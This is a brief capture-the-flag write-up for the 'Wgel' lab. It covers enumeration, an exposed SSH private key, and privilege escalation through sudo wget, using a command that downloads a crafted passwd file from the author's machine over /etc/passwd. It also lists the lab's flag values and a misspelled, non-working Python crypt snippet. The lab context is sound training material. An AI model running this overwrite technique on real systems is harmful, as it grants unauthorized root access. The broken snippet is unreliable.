# Wgel CTF

> Mihai Stanciu | February 03, 2021

```
export ip=10.10.190.56
```
## Enumeration

* Nmap scan in `nmap/initial`

* Gobuster search returns nothing

* Nikto scan returns nothing

* Found comment on web page `Jessie don't forget to update the website!` -- username `jessie`

* Found `id_rsa` at `$ip/sitemap/.ssh`

## Task 1

1. Find the user flag

```
057c67131c3d5e42dd5cd3075b198ff6
```

### Privesc method

* Found `wget` able to be run as `root` by non-root user `jessie`
* Copied `/etc/passwd` and added password for `root`

```py
import cypt

print(cript.cript("password_to_use"))
``` 

* Opened a simple http server on my machine using _python_

```
python3 -m http.server
```

* Uploaded the new `passwd` file to `/etc/passwd`

```
sudo wget http://$my_ip:8000/passwd -O /etc/passwd
```

* Gained _root privelages_ and found the root flag in `/root/root_flag.txt`

2. Find the root flag

```
b1b968b37519ad1daa6408188649263d
```